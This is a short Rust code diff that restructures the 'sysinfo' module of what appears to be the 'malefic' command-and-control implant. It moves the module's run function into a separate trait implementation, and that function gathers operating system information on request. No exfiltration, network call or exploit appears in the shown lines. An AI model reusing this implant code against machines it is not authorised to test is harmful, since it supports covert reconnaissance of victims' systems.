@@ -7,8 +7,11 @@ use malefic_proto::proto::implantpb::spite::Body;
 pub struct SysInfo {}
 #[async_trait]
 #[module_impl("sysinfo")]
-impl Module for SysInfo {
-    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _sender: &mut crate::Output) -> crate::Result {
+impl Module for SysInfo {}
+
+#[async_trait]
+impl crate::ModuleImpl for SysInfo {
+    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _: &mut crate::Output) -> crate::Result {
         let _ = check_request!(receiver, Body::Request)?;
         let info = malefic_helper::common::sysinfo::get_sysinfo();
         let os = info.os.unwrap();
